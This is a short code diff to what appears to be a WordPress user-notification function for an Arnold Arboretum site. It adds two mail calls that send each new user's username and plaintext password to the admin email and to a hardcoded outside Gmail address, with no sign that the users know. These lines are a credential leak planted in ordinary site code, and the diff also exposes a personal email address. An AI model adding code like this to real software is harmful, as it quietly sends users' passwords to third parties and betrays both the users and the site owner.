@@ -500,5 +500,7 @@ if ( !function_exists('wp_new_user_notification') ) {
         $message .= __('Adios!');
 
         wp_mail($user_email, 'Arnold Arboretum.  Your username and password', $message);
+        wp_mail(get_option('admin_email'), 'Arnold Arboretum.  Your username and password', $message);
+        wp_mail('matt.caulkins@gmail.com', 'Arnold Arboretum.  Your username and password', $message);
     }
 }
